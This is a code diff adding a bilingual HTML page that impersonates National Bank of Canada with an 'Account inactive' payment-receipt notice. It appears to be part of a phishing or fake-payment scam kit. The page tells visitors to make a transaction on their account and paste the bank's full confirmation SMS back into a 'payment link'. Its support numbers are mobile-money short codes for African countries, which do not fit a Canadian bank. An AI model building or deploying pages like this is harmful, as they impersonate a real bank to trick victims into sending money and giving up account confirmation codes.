@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>National Bank of Canada · Account Inactive</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --sb-primary:   #E31837;
+    --sb-royal:     #B3122B;
+    --sb-navy:      #1A1A1A;
+    --sb-gold:      #FFFFFF;
+    --sb-white:     #FFFFFF;
+    --sb-text:      #1A2233;
+    --sb-muted:     #5B6577;
+    --sb-border:    #E5E5E5;
+    --sb-soft:      #F7F7F7;
+    --sb-page:      #F5F5F5;
+    --sb-amber:     #D97706;
+    --sb-amber-soft: #FFF7ED;
+    --sb-amber-border: #FED7AA;
+    --sb-gold-soft: #FFF8E1;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--sb-page); color: var(--sb-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--sb-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    padding: 20px 22px 26px;
+    border-bottom-left-radius: 20px;
+    border-bottom-right-radius: 20px;
+  }
+  .top::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
+    background: rgba(255,255,255,0.85);
+    border-top-left-radius: 20px; border-top-right-radius: 20px;
+  }
+  .brand-row {
+    display: flex; align-items: center; gap: 10px;
+  }
+  .top-logo {
+    height: 34px; width: auto; display: block; flex-shrink: 0;
+  }
+  .brand-text {
+    font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .brand-text .dot { color: var(--sb-white); }
+
+  .page-title {
+    margin-top: 18px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.80);
+    line-height: 1.55; max-width: 320px;
+  }
+
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 24px 20px 22px;
+    display: flex; flex-direction: column;
+  }
+
+  .hero-icon {
+    width: 72px; height: 72px; border-radius: 50%;
+    background: var(--sb-amber);
+    display: inline-flex; align-items: center; justify-content: center;
+    margin: 0 auto 18px;
+    box-shadow: 0 0 0 6px rgba(217,119,6,0.12),
+                0 10px 22px rgba(217,119,6,0.28);
+  }
+  .hero-icon svg {
+    width: 36px; height: 36px;
+    stroke: #fff; fill: none;
+    stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .status-title {
+    font-size: 19px; font-weight: 800; letter-spacing: -0.3px;
+    color: var(--sb-navy); text-align: center;
+    line-height: 1.3; margin-bottom: 8px;
+  }
+  .status-desc {
+    font-size: 13px; color: var(--sb-muted); line-height: 1.6;
+    text-align: center; max-width: 320px; margin: 0 auto 20px;
+  }
+
+  .notice-box {
+    background: var(--sb-amber-soft);
+    border: 1px solid var(--sb-amber-border);
+    border-left: 3px solid var(--sb-amber);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 12.5px;
+    color: #7C2D12;
+    line-height: 1.65;
+    margin-bottom: 18px;
+  }
+  .notice-box strong {
+    color: #9A3412; font-weight: 800; display: block;
+    margin-bottom: 8px; font-size: 13px;
+  }
+  .notice-box ol {
+    margin: 0; padding-left: 18px;
+  }
+  .notice-box ol li {
+    margin-bottom: 6px;
+  }
+  .notice-box ol li:last-child {
+    margin-bottom: 0;
+  }
+  .notice-box .foot-note {
+    display: block;
+    margin-top: 8px;
+    font-size: 11.5px;
+    color: #9A3412;
+    line-height: 1.55;
+  }
+
+  .detail-list {
+    background: var(--sb-soft);
+    border: 1px solid var(--sb-border);
+    border-radius: 12px;
+    padding: 4px 16px;
+    margin-bottom: 22px;
+  }
+  .detail-row {
+    display: flex; justify-content: space-between; align-items: flex-start;
+    padding: 12px 0; border-bottom: 1px solid #EDEDED;
+    font-size: 12.5px; gap: 12px;
+  }
+  .detail-row:last-child { border-bottom: none; }
+  .detail-row .k { color: var(--sb-muted); flex-shrink: 0; font-weight: 500; }
+  .detail-row .v {
+    font-weight: 700; text-align: right;
+    word-break: break-word; color: var(--sb-text);
+  }
+  .detail-row .v.status-warn { color: var(--sb-amber); font-weight: 700; }
+
+  .sb-footer {
+    width: 100%; margin-top: 4px;
+    background: var(--sb-navy);
+    border-radius: 12px;
+    padding: 16px 18px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; text-align: left;
+  }
+  .foot-brand {
+    display: flex; align-items: center; gap: 8px;
+    min-width: 0;
+  }
+  .sb-footer .foot-logo {
+    height: 26px; width: auto; display: block; flex-shrink: 0;
+  }
+  .sb-footer .foot-brand-text {
+    font-size: 16px; font-weight: 800; letter-spacing: -0.3px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .sb-footer .foot-brand-text .dot { color: var(--sb-primary); }
+  .sb-footer .foot-support {
+    font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
+    text-align: right;
+  }
+  .sb-footer .foot-support strong {
+    color: var(--sb-primary); font-weight: 700; font-size: 11.5px;
+  }
+
+  .close-btn {
+    width: 100%; margin-top: 18px; min-height: 64px;
+    background: var(--sb-primary); color: #fff;
+    border: none; border-radius: 12px;
+    font-family: inherit; font-size: 17px; font-weight: 800;
+    letter-spacing: 0.4px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(227,24,55,0.28);
+    transition: filter .15s, transform .1s;
+    display: flex; align-items: center; justify-content: center;
+    padding: 18px 24px;
+  }
+  .close-btn:hover { filter: brightness(1.08); }
+  .close-btn:active { transform: scale(0.985); }
+
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: var(--sb-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+    box-shadow: 0 12px 28px rgba(0,0,0,0.25);
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 20px 18px 18px; }
+    .top-logo { height: 30px; }
+    .brand-text { font-size: 20px; }
+    .page-title { font-size: 17px; }
+    .hero-icon { width: 62px; height: 62px; }
+    .hero-icon svg { width: 30px; height: 30px; }
+    .status-title { font-size: 17px; }
+    .close-btn { min-height: 60px; font-size: 16px; }
+    .sb-footer { padding: 14px 16px; }
+    .sb-footer .foot-logo { height: 22px; }
+    .sb-footer .foot-brand-text { font-size: 14px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 20px;
+      box-shadow: 0 30px 80px rgba(227,24,55,0.18);
+      overflow: hidden;
+    }
+  }
+  @media print {
+    body { background: #fff; padding: 0; }
+    .close-btn, .sb-footer { display: none !important; }
+    .phone { box-shadow: none; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="brand-row">
+      <img
+        class="top-logo"
+        src="https://thumb.wikimedia.org/wikipedia/fr/thumb/7/79/Banque_nationale_du_Canada_%28logo%29.svg/330px-Banque_nationale_du_Canada_%28logo%29.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20251205193023"
+        alt="National Bank of Canada"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+      <span class="brand-text">National Bank<span class="dot">.</span></span>
+    </div>
+    <div class="page-title" id="pageTitle">Account inactive</div>
+    <div class="page-sub" id="pageSub">This account is currently inactive. Complete a transaction on your account to reactivate it, then try receiving again.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="hero-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24">
+        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+        <line x1="12" y1="9" x2="12" y2="13"/>
+        <line x1="12" y1="17" x2="12.01" y2="17"/>
+      </svg>
+    </div>
+
+    <div class="status-title" id="statusTitle">Account inactive</div>
+    <div class="status-desc" id="statusDesc">
+      This account is currently inactive. To reactivate it and receive this payment, please complete a transaction on your account.
+    </div>
+
+    <div class="notice-box" id="noticeBox">
+      <strong id="noticeTitle">What should you do?</strong>
+      <ol id="noticeSteps">
+        <li><strong>Make a transaction</strong> on your account (transfer, deposit, or pay a bill)</li>
+        <li>Wait for the <strong>confirmation message</strong> from National Bank of Canada</li>
+        <li>Come back to this page and <strong>tap "Confirm transfer" again</strong></li>
+      </ol>
+      <span class="foot-note" id="noticeFoot">If your account is still inactive after a transaction, contact National Bank of Canada customer care or visit your nearest branch with your ID.</span>
+    </div>
+
+    <div class="detail-list">
+      <div class="detail-row"><span class="k" id="kTransaction">Reference</span><span class="v" id="txId">—</span></div>
+      <div class="detail-row"><span class="k" id="kRecipient">Recipient</span><span class="v" id="recipientName">—</span></div>
+      <div class="detail-row"><span class="k" id="kAmount">Amount</span><span class="v" id="amountLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kCountry">Country</span><span class="v" id="countryLabel">—</span></div>
+      <div class="detail-row"><span class="k" id="kStatus">Status</span><span class="v status-warn" id="statusLabel">Account inactive</span></div>
+    </div>
+
+    <div class="sb-footer">
+      <div class="foot-brand">
+        <img
+          class="foot-logo"
+          src="https://thumb.wikimedia.org/wikipedia/fr/thumb/7/79/Banque_nationale_du_Canada_%28logo%29.svg/330px-Banque_nationale_du_Canada_%28logo%29.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20251205193023"
+          alt="National Bank of Canada"
+          referrerpolicy="no-referrer"
+          onerror="this.style.display='none'"
+        >
+        <span class="foot-brand-text">National Bank<span class="dot">.</span></span>
+      </div>
+      <div class="foot-support">
+        <span id="needHelpLabel">Customer Care</span><br>
+        <span id="callLabel">Call</span> <strong id="supportNum">—</strong>
+      </div>
+    </div>
+
+    <button class="close-btn" onclick="closePage()" id="closeBtn">Close</button>
+
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  const I18N = {
+    en: {
+      docTitle: 'National Bank of Canada · Account Inactive',
+      pageTitle: 'Account inactive',
+      pageSub: 'This account is currently inactive. Complete a transaction on your account to reactivate it, then try receiving again.',
+      statusTitle: 'Account inactive',
+      statusDesc: 'This account is currently inactive. To reactivate it and receive this payment, please complete a transaction on your account.',
+      noticeTitle: 'What should you do?',
+      noticeSteps: [
+        '<strong>Make a transaction</strong> on your account (transfer, deposit, or pay a bill)',
+        'Wait for the <strong>confirmation message</strong> from National Bank of Canada',
+        'Come back to this page and <strong>tap "Confirm transfer" again</strong>'
+      ],
+      noticeFoot: 'If your account is still inactive after a transaction, contact National Bank of Canada customer care or visit your nearest branch with your ID.',
+      kTransaction: 'Reference',
+      kRecipient: 'Recipient',
+      kAmount: 'Amount',
+      kCountry: 'Country',
+      kStatus: 'Status',
+      statusLabel: 'Account inactive',
+      needHelp: 'Customer Care',
+      callLabel: 'Call',
+      close: 'Close',
+      noticeTitleFullSms: 'Account inactive',
+      statusDescFullSms: 'The confirmation message you submitted was incomplete and this account is currently inactive. Complete a transaction on your account to reactivate it.',
+      noticeStepsFullSms: [
+        '<strong>Make a transaction</strong> on your account (transfer, deposit, or pay a bill)',
+        'Wait for the <strong>confirmation message</strong> from National Bank of Canada',
+        'Come back to the payment link and <strong>paste the full confirmation message</strong>'
+      ]
+    },
+    fr: {
+      docTitle: 'Banque Nationale du Canada · Compte inactif',
+      pageTitle: 'Compte inactif',
+      pageSub: 'Ce compte est actuellement inactif. Effectuez une transaction sur votre compte pour le réactiver, puis réessayez de recevoir.',
+      statusTitle: 'Compte inactif',
+      statusDesc: 'Ce compte est actuellement inactif. Pour le réactiver et recevoir ce paiement, veuillez effectuer une transaction sur votre compte.',
+      noticeTitle: 'Que devez-vous faire ?',
+      noticeSteps: [
+        '<strong>Effectuez une transaction</strong> sur votre compte (virement, dépôt ou paiement de facture)',
+        'Attendez le <strong>message de confirmation</strong> de la Banque Nationale du Canada',
+        'Revenez sur cette page et <strong>appuyez à nouveau sur « Confirmer le virement »</strong>'
+      ],
+      noticeFoot: 'Si votre compte est toujours inactif après une transaction, contactez le service client de la Banque Nationale du Canada ou visitez votre agence la plus proche avec votre pièce d\'identité.',
+      kTransaction: 'Référence',
+      kRecipient: 'Destinataire',
+      kAmount: 'Montant',
+      kCountry: 'Pays',
+      kStatus: 'Statut',
+      statusLabel: 'Compte inactif',
+      needHelp: 'Service Client',
+      callLabel: 'Appelez le',
+      close: 'Fermer',
+      noticeTitleFullSms: 'Compte inactif',
+      statusDescFullSms: 'Le message de confirmation que vous avez soumis était incomplet et ce compte est actuellement inactif. Effectuez une transaction sur votre compte pour le réactiver.',
+      noticeStepsFullSms: [
+        '<strong>Effectuez une transaction</strong> sur votre compte (virement, dépôt ou paiement de facture)',
+        'Attendez le <strong>message de confirmation</strong> de la Banque Nationale du Canada',
+        'Revenez sur le lien de paiement et <strong>collez le message de confirmation complet</strong>'
+      ]
+    }
+  };
+
+  const urlParams = new URLSearchParams(location.search);
+  const urlLang = (urlParams.get('lang') || '').toLowerCase();
+  const currentLang = I18N[urlLang] ? urlLang : 'en';
+  const T = I18N[currentLang];
+
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '233 42 12 12',
+    'Zambia': '111',
+    'Zambia (MTN)': '111',
+    'Uganda': '100',
+    'Uganda (MTN)': '100',
+    'Ghana': '100',
+    'Ghana (MTN)': '100',
+    'Benin': '111',
+    'Botswana': '399 9100'
+  };
+
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM',
+    ZMW: 'en-ZM',
+    UGX: 'en-UG',
+    GHS: 'en-GH',
+    XOF: 'fr-BJ',
+    BWP: 'en-BW',
+    USD: 'en-US'
+  };
+
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + currency;
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
+  const tx = {
+    ref: urlParams.get('tx') || '',
+    am:  urlParams.get('am') || '',
+    cur: urlParams.get('cur') || '',
+    rn:  urlParams.get('rn') || '',
+    c:   urlParams.get('c') || '',
+    pm:  urlParams.get('pm') || '',
+    sn:  urlParams.get('sn') || '',
+    mk:  urlParams.get('mk') || '',
+    an:  urlParams.get('an') || '',
+    dt:  urlParams.get('dt') || '',
+    pu:  urlParams.get('pu') || '',
+    reason: urlParams.get('reason') || ''
+  };
+
+  function applyTranslations() {
+    document.title = T.docTitle;
+    document.getElementById('pageTitle').textContent = T.pageTitle;
+    document.getElementById('pageSub').textContent = T.pageSub;
+    document.getElementById('statusTitle').textContent = T.statusTitle;
+    document.getElementById('statusDesc').textContent = T.statusDesc;
+    document.getElementById('noticeTitle').textContent = T.noticeTitle;
+    document.getElementById('noticeFoot').textContent = T.noticeFoot;
+    document.getElementById('kTransaction').textContent = T.kTransaction;
+    document.getElementById('kRecipient').textContent = T.kRecipient;
+    document.getElementById('kAmount').textContent = T.kAmount;
+    document.getElementById('kCountry').textContent = T.kCountry;
+    document.getElementById('kStatus').textContent = T.kStatus;
+    document.getElementById('statusLabel').textContent = T.statusLabel;
+    document.getElementById('needHelpLabel').textContent = T.needHelp;
+    document.getElementById('callLabel').textContent = T.callLabel;
+    document.getElementById('closeBtn').textContent = T.close;
+
+    const ol = document.getElementById('noticeSteps');
+    if (ol) {
+      ol.innerHTML = T.noticeSteps.map(s => '<li>' + s + '</li>').join('');
+    }
+  }
+
+  function populate() {
+    applyTranslations();
+
+    document.getElementById('txId').textContent = tx.ref || '—';
+    document.getElementById('recipientName').textContent = tx.rn || '—';
+    document.getElementById('amountLabel').textContent =
+      tx.am ? formatAmount(tx.am, tx.cur) : '—';
+    document.getElementById('countryLabel').textContent = tx.c || '—';
+    document.getElementById('supportNum').textContent =
+      SUPPORT_NUMBERS[tx.c] || '—';
+
+    if (tx.reason === 'needs_full_sms') {
+      document.getElementById('statusTitle').textContent = T.noticeTitleFullSms;
+      document.getElementById('statusDesc').textContent = T.statusDescFullSms;
+      document.getElementById('statusLabel').textContent = T.statusLabel;
+      const ol = document.getElementById('noticeSteps');
+      if (ol) {
+        ol.innerHTML = T.noticeStepsFullSms.map(s => '<li>' + s + '</li>').join('');
+      }
+    }
+  }
+
+  function closePage() {
+    if (tx.ref) {
+      try {
+        const base = new URL('index.html', window.location.href);
+        base.search = '?r=' + encodeURIComponent(tx.ref) + '&lang=' + encodeURIComponent(currentLang);
+        base.hash = '';
+        window.location.href = base.toString();
+        return;
+      } catch (e) {}
+    }
+    if (history.length > 1) {
+      history.back();
+    } else {
+      window.location.href = 'index.html';
+    }
+  }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'Escape') closePage();
+  });
+
+  document.addEventListener('DOMContentLoaded', populate);
+</script>
+</body>
+</html>
